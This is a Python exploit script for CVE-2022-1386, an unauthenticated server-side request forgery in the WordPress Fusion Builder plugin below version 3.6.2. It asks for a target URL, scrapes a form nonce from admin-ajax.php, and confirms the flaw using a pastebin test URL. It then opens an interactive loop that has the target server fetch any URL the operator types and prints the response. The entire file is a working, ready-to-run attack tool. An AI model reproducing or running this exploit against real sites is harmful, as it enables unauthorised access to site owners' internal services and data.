#!/usr/bin/env python3
"""
CVE-2022-1386 - Fusion Builder < 3.6.2 - Unauthenticated SSRF
author: Naufal Reky Ardhana <ardzz@indoxploit.or.id>
Adapted: Maddy â€” added robust networking, retries, debug mode, and safer encoding.
"""

import binascii
import json
import os
import requests
import urllib3
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ---- Configuration ----
DEBUG_VERIFY = False   # set True to skip TLS verification for debugging (not recommended for production)
REQUEST_TIMEOUT = 15   # seconds
RETRIES = 2            # number of retries for transient failures
USE_MULTIPART = False  # if True, use the script's multipart builder; else use urlencoded POST

# Optional proxy (for burp). Set to None to not use a proxy. Example: {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
PROXIES = None


def display_banner():
    print(
        """
             CVE-2022-1386 - Fusion Builder < 3.6.2 - Unauthenticated SSRF
            ___   ____ ___  ___       ________ ____  _____
           |__ \\ / __ \\__ \\|__ \\     <  /__  /( __ )/ ___/
           __/ // / / / /_/ /__/ /_____/ / /_ </ __  / __ \\ 
         / __// /_/ / __// __/_____/ /___/ / /_/ / /_/ / 
        /____/\\____/____/____/    /_//____/\\____/\\____/  
        """)


def encode_multipart_form_data(fields: dict):
    """
    Build a simple multipart/form-data body (string).
    This function is preserved for compatibility but WordPress admin-ajax typically accepts urlencoded form data.
    """
    boundary = binascii.hexlify(os.urandom(16)).decode('ascii')

    body = (
        "".join(
            "--%s\r\n"
            "Content-Disposition: form-data; name=\"%s\"\r\n"
            "\r\n"
            "%s\r\n" % (boundary, field, value)
            for field, value in fields.items()
        ) +
        "--%s--\r\n" % boundary
    )

    content_type = "multipart/form-data; boundary=%s" % boundary
    return body, content_type


class CVE_2022_1386:
    def __init__(self, url):
        self.request = None
        self.test_url = "https://pastebin.com/raw/XNBxNyaU"
        self.fusion_id = None
        self.url = url.rstrip("/")
        self.domain = self.url.split("//")[1].split("/")[0]
        self.session = self._make_session()
        self.make_folder()

    def _make_session(self):
        s = requests.Session()
        retry = Retry(
            total=RETRIES,
            backoff_factor=0.5,
            status_forcelist=(429, 500, 502, 503, 504),
            allowed_methods=frozenset(['GET', 'POST'])
        )
        s.mount("https://", HTTPAdapter(max_retries=retry))
        s.mount("http://", HTTPAdapter(max_retries=retry))
        if PROXIES:
            s.proxies.update(PROXIES)
        # default UA (you can change)
        s.headers.update({'User-Agent': 'CVE-2022-1386-Check/1.0'})
        return s

    def make_folder(self):
        os.makedirs("output", exist_ok=True)
        os.makedirs(f"output/{self.domain}", exist_ok=True)

    def save_fusion_id(self):
        with open(f"output/{self.domain}/fusion_id.txt", "w") as f:
            f.write(self.fusion_id or "")

    def load_fusion_id(self):
        path = f"output/{self.domain}/fusion_id.txt"
        if os.path.exists(path):
            with open(path, "r") as f:
                self.fusion_id = f.read().strip()
                return self.fusion_id
        else:
            return None

    def generate_fusion_id(self):
        """
        Requests the admin-ajax endpoint to retrieve the fusion-form-nonce input value.
        Wrapped in exception handling and robust headers.
        """
        headers = {
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": self.url + "/",
            "Origin": self.url,
        }
        data = {"action": "fusion_form_update_view"}
        fusion_id = self.load_fusion_id()
        if fusion_id:
            return fusion_id

        try:
            r = self.session.post(
                self.url + "/wp-admin/admin-ajax.php",
                headers=headers,
                data=data,
                timeout=REQUEST_TIMEOUT,
                verify=DEBUG_VERIFY
            )
        except requests.exceptions.SSLError as e:
            print("[!] TLS/SSL error while requesting fusion id:", e)
            return None
        except requests.exceptions.ConnectTimeout:
            print("[!] Connection timed out while requesting fusion id")
            return None
        except requests.exceptions.ConnectionError as e:
            print("[!] Connection error while requesting fusion id:", repr(e))
            return None
        except Exception as e:
            print("[!] Unexpected exception while requesting fusion id:", repr(e))
            return None

        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "html.parser")
            try:
                self.fusion_id = soup.find("input", {"name": "fusion-form-nonce-0"})["value"]
                self.save_fusion_id()
                return self.fusion_id
            except Exception:
                # debug info
                print("[*] Could not find fusion-form-nonce-0 in response. Response snippet:")
                print(r.text[:800])
                return None
        else:
            print(f"[*] Unexpected status code when getting fusion id: {r.status_code}")
            return None

    def exploit(self, payload):
        fusion_id = self.generate_fusion_id()
        if fusion_id is None:
            return {"status": "failed", "reason": "no_fusion_id"}

        # Build form data
        data = {
            "formData": f"email=example%40example.com&fusion_privacy_store_ip_ua=false"
                        f"&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore"
                        f"&fusion-form-nonce-0={fusion_id}&fusion-fields-hold-private-data=",
            "action": "fusion_form_submit_form_to_url",
            "fusion_form_nonce": fusion_id,
            "form_id": "0",
            "post_id": "0",
            "field_labels": '{"email":"Email address"}',
            "hidden_field_names": "[]",
            "fusionAction": payload,
            "fusionActionMethod": "GET"
        }

        # Option A: simple urlencoded post (recommended for admin-ajax)
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Referer": self.url + "/",
            "Origin": self.url,
        }

        try:
            if USE_MULTIPART:
                body, content_type = encode_multipart_form_data(data)
                headers["Content-Type"] = content_type
                r = self.session.post(
                    self.url + "/wp-admin/admin-ajax.php",
                    headers=headers,
                    data=body,
                    timeout=REQUEST_TIMEOUT,
                    verify=DEBUG_VERIFY
                )
            else:
                # requests will encode data as application/x-www-form-urlencoded
                r = self.session.post(
                    self.url + "/wp-admin/admin-ajax.php",
                    headers=headers,
                    data=data,
                    timeout=REQUEST_TIMEOUT,
                    verify=DEBUG_VERIFY
                )
        except requests.exceptions.SSLError as e:
            print("[!] TLS/SSL error while sending exploit:", e)
            return {"status": "failed", "reason": "ssl_error"}
        except requests.exceptions.ConnectTimeout:
            print("[!] Connection timed out while sending exploit")
            return {"status": "failed", "reason": "timeout"}
        except requests.exceptions.ConnectionError as e:
            print("[!] Connection error while sending exploit:", repr(e))
            return {"status": "failed", "reason": "conn_error"}
        except Exception as e:
            print("[!] Unexpected exception while sending exploit:", repr(e))
            return {"status": "failed", "reason": "unexpected_exception"}

        # store the PreparedRequest so we can save it later if needed
        try:
            self.request = r.request
        except Exception:
            self.request = None

        # interpret response
        if r is None:
            return {"status": "failed"}
        if r.status_code == 200:
            try:
                return r.json()
            except json.decoder.JSONDecodeError:
                return {"status": "failed", "reason": "no_json", "text_snippet": r.text[:500]}
        else:
            return {"status": "failed", "status_code": r.status_code, "text_snippet": r.text[:300]}

    def save_raw_request(self, filename):
        if not self.request:
            print("[!] No request to save.")
            return
        # PreparedRequest fields: method, url, headers, body (bytes or str)
        headers = [f"{k}: {v}" for k, v in self.request.headers.items()]
        body = self.request.body or ""
        if isinstance(body, bytes):
            try:
                body = body.decode('utf-8', 'replace')
            except Exception:
                body = str(body)
        with open(filename, "w", encoding="utf-8") as f:
            f.write(self.request.method + " " + self.request.url + " HTTP/1.1\r\n")
            f.write("\r\n".join(headers))
            f.write("\r\n\r\n")
            f.write(body)


if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    display_banner()
    url = input("[>] Target URL: ").strip()
    if not url.startswith("http"):
        print("[!] Please include http:// or https:// in the URL.")
        raise SystemExit(1)

    cve = CVE_2022_1386(url)
    print("[+] Testing SSRF...")
    result = cve.exploit(cve.test_url)

    # result may be dict with 'info' key on successful SSRF PoC
    info = ""
    if isinstance(result, dict):
        info = result.get("info", "") or result.get("text_snippet", "") or ""
    else:
        # fallback: try to stringify
        try:
            info = str(result)
        except Exception:
            info = ""

    if "3e87da640674ddd9c7bafbc1932b91c9" in info:
        print("[+] Target is vulnerable to SSRF!")
        print("[+] Saving raw request...")
        cve.save_raw_request(f"output/{cve.domain}/raw_request.txt")
        print(f"[+] Raw request saved to output/{cve.domain}/raw_request.txt")

        while True:
            payload = input("[>] Payload: ")
            if payload.lower() in ("exit", "quit"):
                break
            print("[+] Sending payload...")
            result = cve.exploit(payload)
            if isinstance(result, dict) and result.get('status') == 'success':
                print("[+] Response:")
                print(result.get('info') or result.get('text_snippet') or result)
            else:
                print("[-] Payload is not working! Debug info:")
                print(result)
    else:
        print("[-] Target is not vulnerable to SSRF!")
        # helpful debug output
        print("Debug result:")
        print(result)

